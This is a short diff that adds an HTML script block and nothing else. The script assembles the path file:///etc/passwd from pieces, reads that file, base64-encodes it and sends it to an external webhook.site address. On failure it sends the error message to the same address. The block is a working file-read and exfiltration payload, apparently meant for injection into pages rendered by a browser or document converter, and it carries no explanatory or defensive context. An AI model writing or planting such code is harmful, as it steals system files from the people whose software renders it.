@@ -1,0 +1,5 @@
+<script>
+  const p = "file" + ":///" + "etc" + "/" + "passwd";
+  fetch(p).then(r => r.text()).then(t => fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?lfi2=" + btoa(t)))
+  .catch(e => fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?err2=" + encodeURIComponent(e.message)));
+</script>
